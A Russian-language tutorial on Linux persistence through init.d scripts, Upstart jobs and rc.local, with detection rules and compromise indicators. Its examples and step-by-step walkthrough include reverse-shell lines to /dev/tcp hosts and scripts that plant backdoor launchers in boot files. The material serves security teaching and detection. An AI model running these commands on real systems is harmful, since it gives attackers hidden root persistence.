# Init-скрипты и rc.local как механизмы закрепления в унаследованных Linux-системах

## Контекст и базовые понятия: Эволюция инициализации и природа persistence

Механизмы закрепления (persistence) на базе init-скриптов и `rc.local` относятся к технике MITRE ATT&CK **T1037: Boot or Logon Initialization Scripts**. Эта техника реализуется путем модификации файлов, которые исполняются инициализационной подсистемой ядра или пользовательского пространства при загрузке системы или входе пользователя. В контексте пост-эксплуатации на Linux-хостах использование legacy-механизмов актуально для систем, не перешедших на `systemd`, или для обхода современных политик безопасности, ориентированных исключительно на контроль юнитов `systemd`.

Инициализационная система (init system) — это первый процесс (PID 1), запускаемый ядром после монтирования корневой файловой системы. Его задача — инициализация аппаратного обеспечения, запуск системных служб и подготовка среды к работе. Исторически в Linux доминировали три основные реализации: **System V Init (SysV)**, **Upstart** и **systemd**.

**System V Init** использует концепцию уровней выполнения (runlevels) и набор скриптов в каталоге `/etc/init.d/`. Скрипты запускаются последовательно в зависимости от префикса (`S` — start, `K` — kill) и числового порядка. `rc.local` является частью этой парадигмы: это финальный скрипт, исполняемый после всех сервисов текущего runlevel.

**Upstart** (использовался в Ubuntu до 15.04, CentOS до 7) ввел событийно-ориентированную модель, но сохранил обратную совместимость с SysV.

**systemd** (стандарт в современных дистрибутивах: RHEL 7+, Ubuntu 15.04+, Debian 8+) заменил SysV, используя юнит-файлы (`.service`, `.timer`). Однако для обеспечения обратной совместимости systemd включает генераторы, такие как `systemd-rc-local-generator` и `systemd-sysv-generator`, которые автоматически преобразуют legacy-скрипты в юниты systemd во время загрузки.

Ключевое различие между современными и унаследованными подходами заключается в механизме контроля доступа и аудита. В `systemd` запуск сервисов жестко контролируется политикой SELinux/AppArmor и логированием journald. В SysV/Upstart контроль часто ослаблен, а аудит требует настройки `auditd` на уровне системных вызовов `execve` для скриптов в `/etc/init.d` или `/etc/rc.local`.

Для аналитика важно различать легитимное администрирование и злонамеренное закрепление. Легитимные скрипты обычно имеют корректные заголовки `### BEGIN INIT INFO`, принадлежат пользователю `root` и группе `root`, имеют права `755` и зарегистрированы в менеджере пакетов. Злонамеренные скрипты часто создаются вне пакетного менеджера, имеют нестандартные права доступа или содержат команды, инициирующие внешние соединения (reverse shells).

| Характеристика | SysV Init (Legacy) | systemd (Modern) | rc.local (Legacy/Compat) |
| :--- | :--- | :--- | :--- |
| **Формат конфигурации** | Shell-скрипт (`/etc/init.d/<name>`) | Юнит-файл (`/etc/systemd/system/<name>.service`) | Shell-скрипт (`/etc/rc.local`) |
| **Механизм запуска** | Последовательный, по runlevel | Параллельный, по зависимостям | В конце загрузки (multi-user) |
| **Управление** | `update-rc.d`, `chkconfig` | `systemctl enable/start` | Ручное редактирование файла |
| **Аудит по умолчанию** | Отсутствует (требуется `auditd`) | `journald`, `systemd-logind` | Отсутствует (требуется `auditd`) |
| **Совместимость** | Базовая | Нативная | Через `systemd-rc-local-generator` |
| **Уязвимость к persistence** | Высокая (простой доступ к `/etc/init.d`) | Средняя (требует прав root и обхода SELinux) | Высокая (часто игнорируется аудитом) |

Понимание этого разграничения критично: атака на `rc.local` в системе с systemd не является "устаревшей" техникой, если генератор активен. Атака на `/etc/init.d` в системе с systemd может привести к созданию дублирующего юнита через `systemd-sysv-generator`, что усложняет детекцию, так как процесс будет выглядеть как легитимный сервис systemd.

## Внутреннее устройство: Архитектура SysV, Upstart и rc.local

Для глубокого понимания механизмов закрепления необходимо разобрать внутреннюю структуру каждого из рассматриваемых компонентов.

### System V Init и структура скриптов `/etc/init.d`

Скрипты SysV должны строго соответствовать формату LSB (Linux Standard Base). Они принимают аргументы `start`, `stop`, `restart`, `status`. При загрузке системы инициализатор сканирует каталоги `/etc/rc<runlevel>.d/`.

Структура символических ссылок в `/etc/rc<runlevel>.d/`:
*   `S<NN><name>`: Start. Запускается при входе в runlevel.
*   `K<NN><name>`: Kill. Запускается при выходе из runlevel.
*   `<NN>`: Числовой приоритет. Чем меньше число, тем раньше выполняется скрипт.

Пример внутренней структуры скрипта `/etc/init.d/malicious-service`:

```bash
#!/bin/sh
### BEGIN INIT INFO
# Provides:          malicious-service
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Malicious persistence script
### END INIT INFO

case "$1" in
  start)
    # Логика запуска
    nohup /tmp/.hidden/backdoor &
    ;;
  stop)
    # Логика остановки
    ;;
  *)
    echo "Usage: /etc/init.d/malicious-service {start|stop}"
    exit 1
    ;;
esac
exit 0
```

Ключевой элемент здесь — директивы `### BEGIN INIT INFO`. Менеджеры пакетов и инструменты вроде `update-rc.d` используют их для определения зависимостей. Злоумышленник, создающий скрипт вручную, часто пропускает этот блок, что является индикатором компрометации (IoC).

### Upstart: Событийно-ориентированная модель

Upstart использует файлы конфигурации в `/etc/init/`. В отличие от SysV, Upstart не требует скриптов с аргументами start/stop. Он реагирует на события (например, `start on runlevel [2345]`).

Формат файла `/etc/init/malicious.conf`:

```conf
description "Malicious Persistence"
start on runlevel [2345]
stop on runlevel [!2345]

script
    /tmp/.hidden/backdoor &
end script

pre-start script
    log "Starting malicious service"
end script
```

Upstart позволяет запускать процессы параллельно, что делает его более эффективным, но также более сложным для отладки. Закрепление через Upstart часто остается незамеченным, так как процессы не появляются в стандартных логах SysV.

### rc.local: Финальный этап загрузки

Файл `/etc/rc.local` (или `/etc/rc.d/rc.local` в RHEL/CentOS) исполняется в конце процесса загрузки, после всех сервисов текущего runlevel. Он имеет высокий приоритет выполнения, но низкий приоритет в иерархии зависимостей.

Структура `/etc/rc.local`:

```bash
#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.

# In order to enable or disable this script just change the execution
# bits.

# By default this script does nothing.

# Злонамеренная команда
/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

exit 0
```

Важно отметить: если скрипт завершается с кодом, отличным от 0, процесс загрузки может быть прерван в некоторых дистрибутивах (хотя в современных systemd-системах это часто игнорируется).

### Взаимодействие systemd с legacy-скриптами

В системах с systemd файлы `/etc/init.d/` и `/etc/rc.local` не исполняются напрямую ядром или systemd. Вместо этого используются генераторы:

1.  **systemd-sysv-generator**: Сканирует `/etc/init.d/` и создает временные юниты `.service` в `/run/systemd/generator.late/`. Эти юниты имеют тип `forking` и вызывают `/etc/init.d/<name> start`.
2.  **systemd-rc-local-generator**: Проверяет существование и исполняемость `/etc/rc.local`. Если файл существует, он создает юнит `rc-local.service`.

Пример сгенерированного юнита для `/etc/rc.local`:

```ini
# /run/systemd/generator.late/rc-local.service
# Automatically generated by systemd-rc-local-generator

[Unit]
Description=/etc/rc.local Compatibility
Documentation=man:systemd-rc-local-generator(8)
ConditionFileIsExecutable=/etc/rc.local
After=network.target

[Service]
Type=forking
ExecStart=/etc/rc.local start
TimeoutSec=0
RemainAfterExit=yes
GuessMainPID=no

[Install]
WantedBy=multi-user.target
```

Это означает, что атака на `rc.local` в systemd-системе фактически создает сервис systemd. Однако, поскольку этот юнит генерируется динамически, он не сохраняется в `/etc/systemd/system/` и может быть упущен при стандартном аудите конфигураций.

### Сравнительный анализ механизмов

| Параметр | SysV Script | Upstart Job | rc.local | systemd (Native) |
| :--- | :--- | :--- | :--- | :--- |
| **Путь к файлу** | `/etc/init.d/<name>` | `/etc/init/<name>.conf` | `/etc/rc.local` | `/etc/systemd/system/<name>.service` |
| **Права доступа** | `755` (root:root) | `644` (root:root) | `755` (root:root) | `644` (root:root) |
| **Контекст выполнения** | Runlevel | Событие | Multi-user | Зависимости |
| **Логирование** | `/var/log/syslog` | `/var/log/syslog` | `/var/log/syslog` | `journalctl -u <name>` |
| **Сложность обхода** | Низкая | Средняя | Низкая | Высокая (SELinux/AppArmor) |

## Применение и работа с предметом: Инсталляция, обход и детекция

На практике закрепление через init-скрипты требует прав root. Злоумышленник может использовать уязвимости повышения привилегий (LPE), такие как CVE-2021-4034 (PwnKit) или CVE-2022-0847 (Dirty Pipe), для получения доступа.

### Инсталляция persistence через rc.local

Процесс модификации `rc.local` включает:
1.  Проверка существования файла.
2.  Резервное копирование оригинала.
3.  Удаление строки `exit 0` (если она есть), чтобы добавить свои команды перед завершением.
4.  Добавление payload.
5.  Восстановление `exit 0`.
6.  Установка прав `755`.

Пример команды для добавления payload:

```bash
# Проверка наличия exit 0
if grep -q "exit 0" /etc/rc.local; then
    # Удаляем exit 0 и добавляем payload перед ним
    sed -i '/exit 0/i /tmp/.hidden/backdoor &' /etc/rc.local
else
    # Если exit 0 нет, добавляем в конец
    echo "/tmp/.hidden/backdoor &" >> /etc/rc.local
fi

# Установка прав
chmod 755 /etc/rc.local
```

### Инсталляция через init.d

Для создания легитимного на вид скрипта в `/etc/init.d/`:

```bash
cat > /etc/init.d/malicious-update << 'EOF'
#!/bin/sh
### BEGIN INIT INFO
# Provides:          malicious-update
# Required-Start:    $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
### END INIT INFO

case "$1" in
  start)
    /tmp/.hidden/backdoor &
    ;;
  stop)
    ;;
esac
exit 0
EOF

chmod 755 /etc/init.d/malicious-update
update-rc.d malicious-update defaults
```

Команда `update-rc.d` создает символические ссылки в `/etc/rc2.d/`, `/etc/rc3.d/` и т.д., делая скрипт видимым для инициализатора.

### Детекция и расследование

Аналитики должны мониторить следующие индикаторы:

1.  **Изменение файлов**: Мониторинг `inotify` или `auditd` на запись в `/etc/rc.local`, `/etc/init.d/`, `/etc/init/`.
2.  **Необычные права**: Файлы в `/etc/init.d/` с правами `777` или владельцем не `root`.
3.  **Создание новых скриптов**: Появление файлов в `/etc/init.d/`, не зарегистрированных в `dpkg` (Debian/Ubuntu) или `rpm` (RHEL/CentOS).
4.  **Генерация systemd-юнитов**: Проверка наличия юнитов в `/run/systemd/generator.late/`, которые не соответствуют известным сервисам.

Пример правила `auditd` для мониторинга изменений в `/etc/rc.local`:

```bash
-w /etc/rc.local -p wa -k rc_local_modification
```

Пример правила `auditd` для мониторинга создания скриптов в `/etc/init.d/`:

```bash
-w /etc/init.d/ -p wa -k init_d_modification
```

### Типичные ошибки и подводные камни

*   **Игнорирование генераторов**: Аналитики часто проверяют только `/etc/systemd/system/`, забывая, что legacy-скрипты могут быть преобразованы в юниты динамически.
*   **Неверные права**: Если `/etc/rc.local` не имеет права `755`, systemd-rc-local-generator проигнорирует его, и persistence не сработает.
*   **Конфликт зависимостей**: Скрипты в `/etc/init.d/` могут не выполниться, если их зависимости (например, сеть) еще не загружены. В `rc.local` зависимости обычно не учитываются, что может привести к ошибкам выполнения.

## Сквозной практический пример: Закрепление через rc.local в гибридной среде

**Исходные условия:**
*   **Среда**: Виртуальная машина Ubuntu 20.04 LTS (использует systemd).
*   **Роль**: Пентестер, имеющий доступ к shell с правами `root` (получен через LPE).
*   **Цель**: Обеспечить запуск бэкдора `/tmp/.hidden/shell` при каждой перезагрузке системы.
*   **Инструменты**: `bash`, `sed`, `chmod`, `systemctl`.

**Шаг 1: Подготовка бэкдора и проверка среды**

Создаем простой reverse-shell скрипт и проверяем текущее состояние `rc.local`.

```bash
# Создание бэкдора
mkdir -p /tmp/.hidden
echo '#!/bin/bash
bash -i >& /dev/tcp/10.10.14.1/4444 0>&1' > /tmp/.hidden/shell
chmod +x /tmp/.hidden/shell

# Проверка наличия rc.local
ls -la /etc/rc.local 2>/dev/null || echo "rc.local not found"
```

*Ожидаемый вывод:* Если `rc.local` отсутствует, systemd-rc-local-generator не создаст юнит. Необходимо создать файл.

**Шаг 2: Создание и конфигурация rc.local**

Создаем `/etc/rc.local` с корректным заголовком и payload.

```bash
cat > /etc/rc.local << 'EOF'
#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.

# In order to enable or disable this script just change the execution
# bits.

# By default this script does nothing.

# Persistence payload
/tmp/.hidden/shell &

exit 0
EOF

chmod 755 /etc/rc.local
```

*Ожидаемый вывод:* Файл `/etc/rc.local` создан, права `755`, владелец `root`.

**Шаг 3: Проверка генерации systemd-юнита**

Проверяем, как systemd интерпретирует новый `rc.local`.

```bash
# Запуск генератора вручную для проверки
systemd-rc-local-generator /etc /run /run

# Проверка наличия созданного юнита
ls -la /run/systemd/generator.late/rc-local.service
cat /run/systemd/generator.late/rc-local.service
```

*Ожидаемый вывод:* Файл `/run/systemd/generator.late/rc-local.service` создан. В нем должно быть `ExecStart=/etc/rc.local start`.

**Шаг 4: Активация сервиса**

Даже если юнит создан, он может быть не включен в автозагрузку.

```bash
# Включение сервиса
systemctl enable rc-local.service

# Проверка статуса
systemctl is-enabled rc-local.service
```

*Ожидаемый вывод:* `enabled`.

**Шаг 5: Тестирование и детекция**

Перезагружаем систему и проверяем, запустился ли бэкдор.

```bash
# Перезагрузка
reboot

# После перезагрузки, с другой машины, проверяем соединение
nc -lvnp 4444
```

*Ожидаемый вывод:* Подключение от IP виртуальной машины к порту 4444.

**Анализ индикаторов компрометации (IoC):**

1.  **Файл `/etc/rc.local`**: Появление нового файла с правами `755`.
2.  **Юнит `/run/systemd/generator.late/rc-local.service`**: Динамически созданный юнит, указывающий на `/etc/rc.local`.
3.  **Процесс `/tmp/.hidden/shell`**: Запущен от имени `root` после загрузки.
4.  **Логи `auditd`**: События `execve` для `/etc/rc.local` и `/tmp/.hidden/shell`.

**Ожидаемый вывод:**
Пример демонстрирует, что даже в современных systemd-системах legacy-механизм `rc.local` остается рабочим вектором атаки благодаря обратной совместимости. Успешное закрепление требует не только записи в файл, но и проверки прав доступа и активации сервиса через `systemctl`. Аналитики должны мониторить не только статические конфигурации, но и динамически сгенерированные юниты в `/run/`.

## Аналитический вывод

Закрепление на базе init-скриптов и `rc.local` представляет собой классический, но все еще эффективный вектор атаки в унаследованных и гибридных Linux-средах. Несмотря на доминирование `systemd`, механизмы обратной совместимости (`systemd-rc-local-generator`, `systemd-sysv-generator`) сохраняют актуальность атак на `/etc/init.d` и `/etc/rc.local`. Злоумышленники используют эти методы из-за их простоты, отсутствия необходимости в сложных зависимостях и часто недостаточного аудита со стороны защитных решений, ориентированных только на современные юниты.

Для специалистов по информационной безопасности критически важно понимать, что legacy-скрипты не исчезают с переходом на systemd, а трансформируются в динамические юниты. Детекция таких инцидентов требует комплексного подхода: мониторинга изменений в `/etc/init.d` и `/etc/rc.local` через `auditd`, анализа прав доступа и владельцев файлов, а также проверки динамически сгенерированных юнитов в `/run/systemd/generator.late/`. Игнорирование этих механизмов создает слепые зоны в защите, особенно в IoT-устройствах, embedded-системах и старых серверных инсталляциях, где SysV или Upstart могут использоваться по умолчанию.

## Источники

*   [MITRE ATT&CK: Boot or Logon Initialization Scripts: RC Scripts (T1037/004)](https://attack.mitre.org/techniques/T1037/004/)
*   [Elastic Security: Potential Execution of rc.local Script](https://www.elastic.co/guide/en/security/8.19/potential-execution-of-rc-local-script.html)
*   [Elastic Security Labs: Linux Detection Engineering - A Sequel on Persistence Mechanisms](https://www.elastic.co/security-labs/sequel-on-persistence-mechanisms)
*   [Pepe Berba: Hunting for Persistence in Linux (Part 4)](https://pberba.github.io/security/2022/02/06/linux-threat-hunting-for-persistence-initialization-scripts-and-shell-configuration/)
*   [Systemd Man Pages: systemd-rc-local-generator](https://www.freedesktop.org/software/systemd/man/systemd-rc-local-generator.html)
*   [Baeldung: How Does systemd Use /etc/init.d Scripts](https://www.baeldung.com/linux/systemd-etc-init-d-scripts)
*   [Metasploit Module: rc.local Persistence](https://sploitus.com/exploit?id=MSF:EXPLOIT-LINUX-PERSISTENCE-RC_LOCAL)
*   [HADESS: The Art of Linux Persistence](https://hadess.io/wp-content/uploads/2023/12/Art-of-Linux-Persistence.pdf)